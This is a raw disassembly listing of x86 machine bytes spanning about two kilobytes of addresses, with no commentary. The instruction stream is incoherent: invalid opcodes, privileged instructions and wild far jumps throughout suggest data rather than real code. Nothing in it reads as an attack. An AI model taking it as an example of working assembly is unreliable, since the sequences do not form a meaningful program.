  4121eb:	call   0xa856:0x22e0a7a6
  4121f2:	retf   
  4121f3:	(bad)  
  4121f4:	mov    ecx,0xb588138d
  4121f9:	add    DWORD PTR [ebp-0x64495d6d],ecx
  4121ff:	pushf  
  412200:	and    eax,0x99efa668
  412205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412206:	add    eax,0x146403a3
  41220b:	mov    bh,0x89
  41220d:	ja     0x4121a8
  41220f:	inc    eax
  412210:	adc    BYTE PTR [ecx+0x7ed5e673],bh
  412216:	mov    ds:0xf1ce0a83,al
  41221b:	inc    edi
  41221c:	push   ds
  41221d:	push   ecx
  41221e:	cmp    DWORD PTR [eax],edi
  412220:	leave  
  412221:	jbe    0x412242
  412223:	arpl   WORD PTR [esi],cx
  412225:	ins    BYTE PTR es:[edi],dx
  412226:	rcr    DWORD PTR [eax],cl
  412228:	xor    ch,dh
  41222a:	inc    BYTE PTR [esi-0x35bfaf34]
  412230:	fwait
  412231:	lods   eax,DWORD PTR ds:[esi]
  412232:	and    ebx,DWORD PTR [edx+0x1dc64c52]
  412238:	pop    ds
  412239:	push   edi
  41223a:	sbb    eax,0x28951125
  41223f:	push   esp
  412240:	mov    cl,0xe5
  412242:	loope  0x412280
  412244:	daa    
  412245:	xor    BYTE PTR [ecx-0x64929234],dl
  41224b:	mov    edx,0x68111a19
  412250:	and    eax,0x5352a1be
  412255:	dec    edi
  412256:	iret   
  412257:	jbe    0x4121e0
  412259:	push   ebp
  41225a:	push   0x94b6024
  41225f:	(bad)  
  412260:	push   esp
  412261:	out    dx,eax
  412262:	push   ss
  412263:	xchg   esi,eax
  412264:	mov    ds:0x38a764a5,al
  412269:	sar    edi,cl
  41226b:	mov    eax,0x90956039
  412270:	sbb    eax,0x9d182cb1
  412275:	sub    DWORD PTR ds:0xa3ee7159,ebx
  41227b:	out    dx,al
  41227c:	call   0x315c36b
  412281:	and    esp,esp
  412283:	sub    edi,ebx
  412285:	cmp    ah,bh
  412287:	das    
  412288:	ror    DWORD PTR [edi],cl
  41228a:	test   eax,0xe16c176a
  41228f:	xor    DWORD PTR [eax],0x5856ade7
  412295:	pop    ebx
  412296:	pop    edx
  412297:	mov    ch,BYTE PTR [esi]
  412299:	mov    edi,0xf52c8565
  41229e:	push   ss
  41229f:	(bad)  
  4122a0:	div    BYTE PTR [eax+0x4735fb90]
  4122a6:	clc    
  4122a7:	push   0x5f84ed72
  4122ac:	das    
  4122ad:	ins    BYTE PTR es:[edi],dx
  4122ae:	lahf   
  4122af:	dec    edi
  4122b0:	test   al,0x45
  4122b2:	popa   
  4122b3:	sub    ebx,DWORD PTR [esi+edi*4+0x7c05cf27]
  4122ba:	arpl   WORD PTR [edi],dx
  4122bc:	xchg   DWORD PTR [ebx+0xe4d6a3],edi
  4122c2:	mov    bh,0xe7
  4122c4:	add    eax,0x3fcd2ea8
  4122c9:	imul   ebp,edi,0x8b8ce730
  4122cf:	fsubr  QWORD PTR [ecx+0x287ffd1c]
  4122d5:	cdq    
  4122d6:	ficomp WORD PTR [edx-0x714e5139]
  4122dc:	or     esp,DWORD PTR [ebx+0x29]
  4122df:	mov    esi,ebx
  4122e1:	xchg   edx,eax
  4122e2:	sub    dl,BYTE PTR [ebx+eiz*2+0x6d16d1b]
  4122e9:	add    BYTE PTR [ecx],0xc9
  4122ec:	es mov ebp,0x373a1199
  4122f2:	(bad)  
  4122f4:	mov    BYTE PTR [ebp+0x18cddcba],bl
  4122fa:	loopne 0x41228b
  4122fc:	cdq    
  4122fd:	mov    fs,WORD PTR [edi]
  4122ff:	lods   eax,DWORD PTR ds:[esi]
  412300:	push   ds
  412301:	sub    DWORD PTR [ebx],edi
  412303:	jns    0x412372
  412305:	dec    edx
  412306:	or     DWORD PTR [edi],esp
  412308:	in     al,0x19
  41230a:	cmc    
  41230b:	mov    cl,0x8c
  41230d:	cmp    esp,DWORD PTR [edi]
  41230f:	cmp    BYTE PTR [ebp+ecx*1+0x12],dh
  412313:	sbb    eax,0x1ac77d04
  412318:	jnp    0x4122e2
  41231a:	jae    0x41230d
  41231c:	sbb    al,0x6c
  41231e:	call   0x5f89d2b1
  412323:	popf   
  412324:	jns    0x41235d
  412326:	fadd   QWORD PTR [esi+0x4158e808]
  41232c:	bound  ecx,QWORD PTR [esi+0x4a181fd9]
  412332:	adc    eax,0x7e64b922
  412337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412338:	loope  0x4122eb
  41233a:	mov    ecx,0x9079d76c
  41233f:	sub    ebx,DWORD PTR ds:0xaf4e7244
  412345:	aad    0x58
  412347:	clc    
  412348:	push   edi
  412349:	imul   esi,DWORD PTR [esi-0x709a8506],0xcc731bff
  412353:	popaw  
  412355:	mov    ds:0x9f5f1242,al
  41235a:	jmp    0x4122f4
  41235c:	fs push edi
  41235e:	in     al,0x89
  412360:	gs mov bl,0xd8
  412363:	xor    eax,0xc37bfaf8
  412368:	rcl    BYTE PTR [ebx-0x3997cc7d],cl
  41236e:	cmp    eax,0x1d4ffcc8
  412373:	lods   eax,DWORD PTR ds:[esi]
  412374:	outs   dx,DWORD PTR ds:[esi]
  412375:	sub    eax,0x1a986dc
  41237a:	dec    ebx
  41237b:	fnsetpm(287 only) 
  41237d:	push   ecx
  41237e:	fmul   QWORD PTR [edi]
  412380:	push   es
  412381:	sub    DWORD PTR [ebp-0x339479aa],esi
  412387:	sbb    DWORD PTR [eax],0x83b44fa1
  41238d:	push   es
  41238e:	arpl   WORD PTR [ebx-0x45],bx
  412391:	stos   DWORD PTR es:[edi],eax
  412392:	sbb    DWORD PTR [ebp+0x52],eax
  412395:	out    dx,eax
  412396:	and    eax,0x48f73989
  41239b:	and    esi,edi
  41239d:	gs sti 
  41239f:	fdivr  DWORD PTR [ecx-0x502e2495]
  4123a5:	push   edi
  4123a6:	ins    BYTE PTR es:[edi],dx
  4123a7:	jnp    0x41235e
  4123a9:	mov    al,ds:0xa654eebc
  4123ae:	shl    BYTE PTR [ecx-0x7bff0a5b],1
  4123b4:	mov    eax,ds:0xe701c9de
  4123b9:	(bad)  
  4123ba:	cmp    DWORD PTR [ecx],esi
  4123bc:	call   0x11ff6b29
  4123c1:	mov    bl,0xd7
  4123c3:	xlat   BYTE PTR es:[ebx]
  4123c5:	rcr    dh,1
  4123c7:	mov    ds:0xade78a98,al
  4123cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123cd:	mov    eax,ds:0xafd052cc
  4123d2:	test   al,0xb8
  4123d4:	pop    ss
  4123d5:	mov    ecx,0x19e56ece
  4123da:	not    esi
  4123dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123dd:	test   eax,0x6980afe4
  4123e2:	sti    
  4123e3:	sub    cl,ah
  4123e5:	ins    DWORD PTR es:[edi],dx
  4123e6:	jb     0x41236b
  4123e8:	xlat   BYTE PTR ds:[ebx]
  4123e9:	cmp    DWORD PTR [ebp-0x19],0x669b7c69
  4123f0:	les    ecx,FWORD PTR [ecx-0x8]
  4123f3:	xor    DWORD PTR [eax],esi
  4123f5:	loop   0x4123a0
  4123f7:	adc    BYTE PTR [ebp+0x77],cl
  4123fa:	mov    esp,0x35c2c037
  4123ff:	mov    edx,0x8241a164
  412404:	mov    esp,0x782930a
  412409:	pop    ebx
  41240a:	mov    ebx,0x6b7a49a1
  41240f:	or     al,0x97
  412411:	(bad)  
  412412:	enter  0x2545,0x55
  412416:	int    0x6e
  412418:	(bad)  
  412419:	dec    edx
  41241a:	mov    BYTE PTR [ebp+0x58],dh
  41241d:	adc    edx,DWORD PTR [edi]
  41241f:	jno    0x412417
  412421:	xor    eax,0x1c85e585
  412426:	fs shr esi,cl
  412429:	and    edi,DWORD PTR [ecx+ebp*1+0x2cf81678]
  412430:	xchg   dh,ah
  412432:	cmp    al,0x3f
  412434:	pop    esp
  412435:	push   esi
  412436:	jnp    0x412451
  412438:	pop    edx
  412439:	xchg   edi,eax
  41243a:	jg     0x412408
  41243c:	enter  0x3274,0x97
  412440:	xchg   esi,eax
  412441:	xchg   esp,eax
  412442:	pop    ebx
  412443:	arpl   di,bp
  412445:	mov    esi,0xc4edc849
  41244a:	scas   al,BYTE PTR es:[edi]
  41244b:	sub    eax,0x50e70475
  412450:	out    0xd4,eax
  412452:	stos   BYTE PTR es:[edi],al
  412453:	jb     0x412478
  412455:	(bad)  
  412456:	(bad)  
  412457:	lea    esi,[ebx]
  412459:	out    0xa6,eax
  41245b:	inc    esi
  41245c:	lods   al,BYTE PTR ds:[esi]
  41245d:	push   edx
  41245e:	jp     0x4123f1
  412460:	mov    BYTE PTR [ebx+ecx*1-0x27],dl
  412464:	test   BYTE PTR [edi],dl
  412466:	and    al,0xff
  412468:	or     DWORD PTR [ecx+0x59],edi
  41246b:	lock sub BYTE PTR [ebx-0x577fcf90],ah
  412472:	out    0xec,eax
  412474:	jo     0x4124c4
  412476:	jo     0x412402
  412478:	pop    ds
  412479:	aaa    
  41247a:	pop    esi
  41247b:	jmp    0xe01d:0x48a09daf
  412482:	fstp   QWORD PTR [esi+eax*2-0x4ed1493e]
  412489:	cwde   
  41248a:	mov    eax,DWORD PTR cs:[edx+0x7b]
  41248e:	sbb    eax,DWORD PTR [edx-0x6b50e609]
  412494:	popa   
  412495:	jge    0x41243e
  412497:	cmp    eax,0x3bdce542
  41249c:	adc    BYTE PTR [ebp+0xb],cl
  41249f:	fstp   TBYTE PTR [di-0x1c2]
  4124a4:	jbe    0x4124c7
  4124a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124a7:	sti    
  4124a8:	xor    ah,BYTE PTR [ebp+0x1083baba]
  4124ae:	das    
  4124af:	pop    edi
  4124b0:	outs   dx,BYTE PTR ds:[esi]
  4124b1:	addr16 ret 
  4124b3:	jae    0x4124e3
  4124b5:	in     al,0x53
  4124b7:	retf   0x6e2b
  4124ba:	scas   eax,DWORD PTR es:[edi]
  4124bb:	ret    
  4124bc:	popf   
  4124bd:	pusha  
  4124be:	sub    ebp,esi
  4124c0:	lds    edx,FWORD PTR [esi+edx*8]
  4124c3:	cmp    DWORD PTR [ebx],0x7e23c916
  4124c9:	stos   DWORD PTR es:[edi],eax
  4124ca:	les    esi,FWORD PTR [ecx+0x59]
  4124cd:	xchg   esp,esp
  4124cf:	test   al,0x5d
  4124d1:	xlat   BYTE PTR cs:[ebx]
  4124d3:	scas   eax,DWORD PTR es:[edi]
  4124d4:	inc    ebx
  4124d5:	les    esp,FWORD PTR ds:0x77cd77f
  4124db:	test   BYTE PTR [edx-0x53],cl
  4124de:	sub    al,BYTE PTR [edx+0x7d]
  4124e1:	push   esi
  4124e2:	leave  
  4124e3:	shl    BYTE PTR [esi-0x59e23863],cl
  4124e9:	jp     0x41252a
  4124eb:	sbb    BYTE PTR [ecx+0x3],0xa6
  4124ef:	add    ebx,DWORD PTR [ebx+0x1a2c44fe]
  4124f5:	test   al,0x4a
  4124f7:	cmp    DWORD PTR [eax],esi
  4124f9:	das    
  4124fa:	aam    0x5b
  4124fc:	fs (bad) 
  4124fe:	std    
  4124ff:	icebp  
  412500:	mov    bl,0xd2
  412502:	push   ebx
  412503:	arpl   WORD PTR [edi+0x4876b795],sp
  412509:	repz bswap ebx
  41250c:	push   0x62fbad9b
  412511:	jge    0x4124d2
  412513:	bound  esi,QWORD PTR [ebp+0xf]
  412516:	dec    ecx
  412517:	cmp    BYTE PTR [ecx+0x4d],bh
  41251a:	test   BYTE PTR [esi-0x54],dh
  41251d:	mov    ah,0xaa
  41251f:	and    al,0x4b
  412521:	adc    al,0x6e
  412523:	jnp    0x412561
  412525:	add    al,0x26
  412527:	push   0xfd4b7706
  41252c:	leave  
  41252d:	imul   dx
  412530:	mov    ds:0xa0090860,eax
  412535:	sar    BYTE PTR [ebp-0x2a],cl
  412538:	pop    ss
  412539:	ficom  DWORD PTR [ecx]
  41253b:	loop   0x4124e9
  41253d:	pop    esi
  41253e:	push   esp
  41253f:	xor    al,0x94
  412541:	or     eax,0x7b4892b1
  412546:	retf   0x5988
  412549:	pop    edi
  41254a:	cdq    
  41254b:	push   ebp
  41254c:	mov    BYTE PTR [ebx],bh
  41254e:	and    eax,0xa6e2797a
  412553:	and    edi,edx
  412555:	jae    0x41250d
  412557:	aas    
  412558:	dec    edi
  412559:	scas   eax,DWORD PTR es:[edi]
  41255a:	mov    fs,WORD PTR [ecx+esi*8]
  41255d:	ss jmp 0x4125bf
  412560:	push   edx
  412561:	iret   
  412562:	imul   edi,ecx,0xd311c4b3
  412568:	clc    
  412569:	push   DWORD PTR [ebp+0x10]
  41256c:	xchg   esp,eax
  41256d:	add    ecx,esi
  41256f:	add    ecx,DWORD PTR [edi]
  412571:	mov    edx,0xf6a63734
  412576:	dec    ecx
  412577:	out    0x5,eax
  412579:	pop    ds
  41257a:	je     0x41252c
  41257c:	mov    ds:0xdb05b445,eax
  412581:	xchg   edx,eax
  412582:	inc    ecx
  412583:	ins    BYTE PTR es:[edi],dx
  412584:	cli    
  412585:	lock outs dx,BYTE PTR ds:[esi]
  412587:	out    0x56,eax
  412589:	cmp    eax,0xef951c46
  41258e:	fild   DWORD PTR [edx+0x13852750]
  412594:	dec    edi
  412595:	cdq    
  412596:	jbe    0x412586
  412598:	loop   0x41253a
  41259a:	pop    ecx
  41259b:	aad    0x29
  41259d:	icebp  
  41259e:	xchg   ecx,eax
  41259f:	inc    ebp
  4125a0:	cmp    bl,BYTE PTR [ecx-0x67]
  4125a3:	icebp  
  4125a4:	dec    esp
  4125a5:	pop    ebx
  4125a6:	jno    0x412554
  4125a8:	aas    
  4125a9:	ds push edx
  4125ab:	sbb    al,0xdd
  4125ad:	cmp    al,0xfc
  4125af:	push   ebp
  4125b0:	adc    DWORD PTR [ecx],edx
  4125b2:	mov    bh,0xd6
  4125b4:	jae    0x4125f1
  4125b6:	mov    dl,0x47
  4125b8:	inc    ebp
  4125b9:	xchg   edx,eax
  4125ba:	int    0x1e
  4125bc:	out    dx,eax
  4125bd:	xchg   edi,eax
  4125be:	lahf   
  4125bf:	jmp    0x4125dc
  4125c1:	addr16 (bad) 
  4125c3:	jmp    0x4125a5
  4125c5:	cli    
  4125c6:	jae    0x412625
  4125c8:	je     0x4125fe
  4125ca:	mov    dl,0x45
  4125cc:	inc    ebx
  4125cd:	cwde   
  4125ce:	push   edi
  4125cf:	loopne 0x412593
  4125d1:	adc    al,0x15
  4125d3:	lock popf 
  4125d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125d6:	pusha  
  4125d7:	arpl   WORD PTR [eax-0xd],ax
  4125da:	dec    ebx
  4125db:	adc    eax,0xc6737df3
  4125e0:	adc    al,0x9b
  4125e2:	mov    bh,BYTE PTR [edi-0x1a]
  4125e5:	into   
  4125e6:	jnp    0x4125e6
  4125e8:	lods   eax,DWORD PTR ds:[esi]
  4125e9:	js     0x412633
  4125eb:	cld    
  4125ec:	xor    dh,dl
  4125ee:	test   BYTE PTR [ebp+0x30],0x5f
  4125f2:	sub    BYTE PTR [esi+0x67],bh
  4125f5:	cmp    DWORD PTR [ebx+0x21233018],0x9ca13c48
  4125ff:	int3   
  412600:	lods   eax,DWORD PTR gs:[esi]
  412602:	(bad)  
  412603:	(bad)  
  412604:	(bad)  
  412605:	and    bh,dh
  412607:	adc    ebp,DWORD PTR [eax+0x546891af]
  41260d:	stc    
  41260e:	adc    BYTE PTR [ebx+0x4c],ah
  412611:	add    al,0x44
  412613:	mov    ds:0xd3f643a9,eax
  412618:	mov    esi,0xf0373e7f
  41261d:	mov    BYTE PTR [ebp-0x79],bh
  412620:	lods   al,BYTE PTR ds:[esi]
  412621:	add    al,0xc8
  412623:	test   al,0x3f
  412625:	(bad)  
  412626:	and    esp,esp
  412628:	lods   al,BYTE PTR ds:[esi]
  412629:	xor    al,0x36
  41262b:	push   cs
  41262c:	test   eax,0xe4d668f6
  412632:	jmp    0x4125d9
  412634:	lahf   
  412635:	sub    al,0x71
  412637:	daa    
  412638:	and    ecx,edx
  41263a:	mov    eax,0x1fc0413a
  41263f:	xchg   esp,eax
  412640:	jmp    0x3220:0x980ec5f2
  412647:	in     eax,dx
  412648:	ret    0x97af
  41264b:	mov    bl,0x22
  41264d:	mov    ah,0x5a
  41264f:	xchg   esi,eax
  412650:	pusha  
  412651:	mov    esp,fs
  412653:	pop    esi
  412654:	pop    eax
  412655:	shl    BYTE PTR [edx+0x66ffb009],1
  41265b:	push   ds
  41265c:	mov    BYTE PTR [ebp-0xfcf69b2],cl
  412662:	push   ebp
  412663:	pop    ebp
  412664:	pop    ecx
  412665:	ret    
  412666:	int3   
  412667:	xor    esp,DWORD PTR [edx+0x12]
  41266a:	sbb    BYTE PTR gs:[edx+0x19],ah
  41266e:	daa    
  41266f:	push   edi
  412670:	(bad)  
  412672:	add    BYTE PTR [ebx+edx*8+0x65],dh
  412676:	sub    ecx,DWORD PTR ds:[esi-0x2b]
  41267a:	lock jo 0x4126f2
  41267d:	lods   al,BYTE PTR ds:[esi]
  41267e:	lock sub BYTE PTR [ebp+0x7c97d652],0x44
  412686:	cmp    BYTE PTR [ecx+edi*2],ch
  412689:	scas   al,BYTE PTR es:[edi]
  41268a:	mov    eax,ds:0xaae0934a
  41268f:	paddd  mm7,QWORD PTR [esi+0x46]
  412693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412694:	xor    ah,BYTE PTR [edi-0x1b9ef002]
  41269a:	test   DWORD PTR [esi-0x4e76d3b3],esp
  4126a0:	push   cs
  4126a1:	shl    DWORD PTR [ecx-0x41],1
  4126a4:	mov    bh,0x60
  4126a6:	test   ecx,ebp
  4126a8:	sub    DWORD PTR [ebx],ecx
  4126aa:	leave  
  4126ab:	push   edi
  4126ac:	cmp    DWORD PTR [ecx-0x61c4e3de],edi
  4126b2:	gs cmp cl,ch
  4126b5:	pop    ebx
  4126b6:	jmp    0xdb011e68
  4126bb:	sub    al,0x88
  4126bd:	jmp    0x4ffbe76f
  4126c2:	scas   al,BYTE PTR es:[edi]
  4126c3:	jp     0x41265a
  4126c5:	arpl   WORD PTR [esi+edx*4],dx
  4126c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126c9:	add    bh,BYTE PTR [ecx-0x6b]
  4126cc:	pusha  
  4126cd:	sub    edx,edi
  4126cf:	lds    ebx,FWORD PTR [edx-0x1094d54a]
  4126d5:	sbb    al,0xb7
  4126d7:	je     0x4126ac
  4126d9:	push   ebx
  4126da:	xlat   BYTE PTR ds:[ebx]
  4126db:	cwde   
  4126dc:	jle    0x4126d9
  4126de:	shl    BYTE PTR [eax],0xd6
  4126e1:	(bad)  
  4126e2:	loope  0x412723
  4126e4:	add    eax,0x82870021
  4126e9:	mul    al
  4126eb:	addr16 leave 
  4126ed:	cmp    edx,DWORD PTR [ecx]
  4126ef:	fwait
  4126f0:	(bad)  
  4126f1:	mov    ch,0x6
  4126f3:	adc    ch,BYTE PTR [edi+eax*1]
  4126f6:	and    al,al
  4126f8:	dec    ebp
  4126f9:	data16 ror BYTE PTR [eax-0x7519e8e2],cl
  412700:	xchg   DWORD PTR [edi],eax
  412702:	xchg   ebx,eax
  412703:	mov    ecx,0xe471b4f8
  412708:	pop    esp
  412709:	(bad)  
  41270a:	pop    ebx
  41270b:	pop    eax
  41270c:	inc    ebx
  41270d:	pop    edx
  41270e:	mov    ecx,0x75cf63b6
  412713:	int3   
  412714:	jns    0x41272d
  412716:	mov    bl,0x72
  412718:	mov    edi,0xeb9ccb5e
  41271d:	repz je 0x412759
  412720:	mov    eax,esi
  412722:	xchg   esp,eax
  412723:	cmp    al,0x2e
  412725:	push   ss
  412726:	fwait
  412727:	test   cl,cl
  412729:	(bad)  
  41272a:	retf   0xc8d5
  41272d:	bound  esp,QWORD PTR [edi+0x5c]
  412730:	and    ebp,DWORD PTR [eax-0x7e3db7a4]
  412736:	mov    esp,0xf21fe706
  41273b:	xchg   edx,eax
  41273c:	aad    0xba
  41273e:	fsubp  st(3),st
  412740:	rol    BYTE PTR [edi-0xe41edaa],0x6f
  412747:	mov    eax,ds:0x175d2d16
  41274c:	add    DWORD PTR [edx+edi*2],esp
  41274f:	int    0x2e
  412751:	(bad)  
  412752:	push   ss
  412753:	(bad)  
  412754:	jb     0x412719
  412756:	sub    eax,0xde5f99e
  41275b:	jns    0x4126f7
  41275d:	xor    al,0xca
  41275f:	arpl   WORD PTR [esi],si
  412761:	mov    bh,0x7a
  412763:	iret   
  412764:	mov    ch,0x2c
  412766:	dec    esp
  412767:	into   
  412768:	loope  0x4126ea
  41276a:	sahf   
  41276b:	xchg   DWORD PTR [esi],esp
  41276d:	mov    ah,bh
  41276f:	pop    edi
  412770:	inc    ebp
  412771:	mov    esi,DWORD PTR [eax+0x5f657cf3]
  412777:	jno    0x4127a4
  412779:	mov    cs,WORD PTR [ebp-0x6e]
  41277c:	push   0x2
  41277e:	sti    
  41277f:	stc    
  412780:	jnp    0x412769
  412782:	push   0xffffff8e
  412784:	sbb    DWORD PTR ss:[eax-0x739d7244],esp
  41278b:	adc    ebx,edi
  41278d:	inc    eax
  41278e:	test   eax,0xe8302bc0
  412793:	dec    esp
  412794:	adc    al,0xf2
  412796:	int3   
  412797:	out    dx,al
  412798:	call   0xe2a4:0x3b90bf22
  41279f:	ja     0x412732
  4127a1:	out    dx,eax
  4127a2:	ror    DWORD PTR [esp+eax*2-0x4334b959],0xf9
  4127aa:	mov    WORD PTR [edi],gs
  4127ac:	pop    ebx
  4127ad:	and    BYTE PTR [ebp+0x8cb9d2d],ah
  4127b3:	mov    fs,WORD PTR [eax-0x47]
  4127b6:	xor    ah,BYTE PTR [eax+0x61]
  4127b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127ba:	sbb    BYTE PTR [esi+0x281caf8b],ah
  4127c0:	add    ch,dh
  4127c2:	fst    st(5)
  4127c4:	sbb    al,0x53
  4127c6:	xchg   BYTE PTR [ebp-0x6],bh
  4127c9:	adc    BYTE PTR [edi],bh
  4127cb:	pop    ebx
  4127cc:	in     eax,0x11
  4127ce:	xchg   esp,eax
  4127cf:	ja     0x412796
  4127d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d2:	mov    edx,0xe64487fd
  4127d7:	pop    ebx
  4127d8:	gs xor esp,esi
  4127db:	bound  edi,QWORD PTR [ecx+0x63049cfe]
  4127e1:	loop   0x41283b
  4127e3:	pop    esi
  4127e4:	pop    eax
  4127e5:	dec    eax
  4127e6:	xor    BYTE PTR [esi+eax*2-0x54fe9352],dh
  4127ed:	sar    DWORD PTR [esp+edi*2-0x29],cl
  4127f1:	sti    
  4127f2:	dec    edx
  4127f3:	xor    BYTE PTR [edi+0x3b],0xd4
  4127f7:	fdivr  DWORD PTR [ebp+0x28b647a7]
  4127fd:	gs xchg edx,eax
  4127ff:	jecxz  0x4127fc
  412801:	mov    ebx,0xac4d4503
  412806:	loope  0x4127af
  412808:	jmp    esp
  41280a:	(bad)  [ecx+0x7d]
  41280d:	std    
  41280e:	sbb    dl,ch
  412810:	or     al,0xa1
  412812:	gs push ebp
  412814:	jge    0x4127fe
  412816:	test   BYTE PTR [edi],0x8a
  412819:	stos   BYTE PTR es:[edi],al
  41281a:	xor    BYTE PTR [ebp-0x72],bl
  41281d:	push   ecx
  41281e:	mov    ah,0x68
  412820:	in     eax,dx
  412821:	ins    BYTE PTR es:[edi],dx
  412822:	dec    ecx
  412823:	inc    edi
  412824:	push   ecx
  412825:	fcmovb st,st(2)
  412827:	sub    al,0x78
  412829:	xchg   esp,eax
  41282a:	mov    edi,0xbbc83d4a
  41282f:	mov    ss,ecx
  412831:	xor    eax,0x51ab09c4
  412836:	retf   0x45e8
  412839:	inc    ebp
  41283a:	repnz pop ebp
  41283c:	mov    edi,0x7d907c7f
  412841:	or     bh,ah
  412843:	fs push edi
  412845:	out    dx,al
  412846:	cs add cl,bh
  412849:	adc    BYTE PTR [edi+0x47d4f305],ch
  41284f:	push   dx
  412851:	iret   
  412852:	push   eax
  412853:	jbe    0x412841
  412855:	ins    DWORD PTR es:[edi],dx
  412856:	mov    ebp,0x7aeaf282
  41285b:	sub    al,0x63
  41285d:	addr16 and eax,0x7f898792
  412863:	ror    DWORD PTR ds:0xfa163373,cl
  412869:	std    
  41286a:	add    eax,0x8f7301d3
  41286f:	mov    edx,0x3e94eb7f
  412874:	call   0xd575f604
  412879:	xchg   DWORD PTR [ebp+edx*8+0x7adc88d1],ebx
  412880:	in     al,dx
  412881:	mov    dl,0x53
  412883:	test   edi,edx
  412885:	jns    0x412881
  412887:	xlat   BYTE PTR ds:[ebx]
  412888:	adc    al,0x5f
  41288a:	ja     0x4128d2
  41288c:	sbb    al,0x7d
  41288e:	mov    ah,0x14
  412890:	push   ss
  412891:	pop    esi
  412892:	ss or  eax,0x92f3c5da
  412898:	icebp  
  412899:	or     eax,DWORD PTR [edi]
  41289b:	daa    
  41289c:	sbb    eax,0x98ace974
  4128a1:	sub    DWORD PTR [edi+0x3b],ebx
  4128a4:	lods   al,BYTE PTR cs:[esi]
  4128a6:	mov    BYTE PTR [ecx+0x7],al
  4128a9:	ds (bad) 
  4128ab:	mov    bl,0x40
  4128ad:	test   esp,ebp
  4128af:	mov    al,0xc4
  4128b1:	jmp    0x4128db
  4128b3:	sahf   
  4128b4:	aad    0x12
  4128b6:	sub    al,0x65
  4128b8:	mov    bh,0x38
  4128ba:	inc    ebp
  4128bb:	jg     0x412893
  4128bd:	jp     0x412856
  4128bf:	ins    DWORD PTR es:[edi],dx
  4128c0:	fisttp QWORD PTR [eax]
  4128c2:	imul   BYTE PTR [ecx+ebp*1-0x628517f9]
  4128c9:	jae    0x4128a7
  4128cb:	stc    
  4128cc:	call   0x2cd2d4c1
  4128d1:	in     eax,0xa7
  4128d3:	adc    eax,ebp
  4128d5:	rcr    BYTE PTR [edi],1
  4128d7:	mov    ebx,0x2ff89675
  4128dc:	pop    eax
  4128dd:	gs ins DWORD PTR es:[edi],dx
  4128df:	or     BYTE PTR [ecx-0x5f],ah
  4128e2:	ins    DWORD PTR es:[edi],dx
  4128e3:	sub    esi,DWORD PTR [ecx-0x5bdc2b34]
  4128e9:	inc    esp
  4128ea:	add    BYTE PTR [edx+esi*4],ah
  4128ed:	(bad)  
  4128ef:	mov    al,0x10
  4128f1:	pop    eax
  4128f2:	push   eax
  4128f3:	loopne 0x412919
  4128f5:	cld    
  4128f6:	mov    esp,0x551f6b0e
  4128fb:	push   ds
  4128fc:	sbb    eax,0xa6e743e0
  412901:	into   
  412902:	mov    cs,WORD PTR [ebp+0xf1e448a]
  412908:	imul   edx,DWORD PTR [ecx-0x574042e7],0xb83110e1
  412912:	leave  
  412913:	jmp    DWORD PTR [ebp-0x17496869]
  412919:	pop    ebp
  41291a:	dec    ebx
  41291b:	dec    esp
  41291c:	mov    ch,0xd4
  41291e:	add    al,0x9e
  412920:	mov    ebx,DWORD PTR [esi+0x3c]
  412923:	inc    ebx
  412924:	adc    BYTE PTR [eax],bl
  412926:	adc    edx,edx
  412928:	cwde   
  412929:	sbb    ecx,DWORD PTR [eax]
  41292b:	push   edi
  41292c:	sti    
  41292d:	mov    DWORD PTR [ecx-0x2],eax
  412930:	hlt    
  412931:	lods   eax,DWORD PTR ds:[esi]
  412932:	stos   BYTE PTR es:[edi],al
  412933:	and    al,0xf0
  412935:	fcomip st,st(6)
  412937:	pop    ds
  412938:	push   cs
  412939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41293a:	dec    edi
  41293b:	dec    ecx
  41293c:	pop    eax
  41293d:	cmp    BYTE PTR [ebx+0x2eb85d23],bl
  412943:	and    BYTE PTR [ebp+0x43ec5390],cl
  412949:	in     eax,0x7d
  41294b:	psllq  mm4,QWORD PTR [ebx]
  41294e:	loopne 0x412956
  412950:	sub    DWORD PTR [eax],ecx
  412952:	inc    ebp
  412953:	jp     0x412936
  412955:	(bad)  
  412956:	sbb    BYTE PTR [edi+eiz*2+0x51f48214],cl
  41295d:	mov    dl,BYTE PTR [edi]
  41295f:	push   esi
  412960:	and    dh,BYTE PTR [ecx+0x46]
  412963:	les    edi,FWORD PTR [esi]
  412965:	jns    0x412938
  412967:	pop    es
  412968:	sbb    cl,bl
  41296a:	shl    DWORD PTR [eax+0x6a],cl
  41296d:	xchg   DWORD PTR [edi],edx
  41296f:	lods   al,BYTE PTR ds:[esi]
  412970:	add    eax,0xf9d2e39f
  412975:	pop    esi
  412976:	dec    ebp
  412977:	lea    esp,[esp+ebp*4+0x3b]
  41297b:	adc    esi,DWORD PTR [edx]
  41297d:	hlt    
  41297e:	fst    DWORD PTR [ebp+0x2c]
  412981:	fs push eax
  412983:	jmp    0x41292e
  412985:	pop    DWORD PTR [ebx+0x3088fd4]
  41298b:	xchg   ebp,eax
  41298c:	jmp    0x4129e0
  41298e:	data16 int3 
  412990:	add    dl,BYTE PTR [edi-0x435b08a9]
  412996:	mov    BYTE PTR [ebp+0x6c],ah
  412999:	jbe    0x412972
  41299b:	mov    edi,edx
  41299d:	rcr    BYTE PTR [edx],1
  41299f:	push   edx
  4129a0:	enter  0x2da9,0xd3
  4129a4:	inc    ebx
  4129a5:	inc    ebp
  4129a6:	mov    edx,0x2b52af06
  4129ab:	in     eax,dx
  4129ac:	xchg   BYTE PTR [esi+0x333df5a2],ch
  4129b2:	loop   0x4129dc
  4129b4:	sahf   
  4129b5:	in     al,0xe9
  4129b7:	adc    al,0x5c
  4129b9:	call   0x3cccd3d0
  4129be:	lds    eax,FWORD PTR [edi+0x2ef55fd]
  4129c4:	ss add eax,0xd32e46d2
  4129ca:	xor    bl,BYTE PTR [esi+0x17003700]
  4129d0:	xchg   ecx,eax
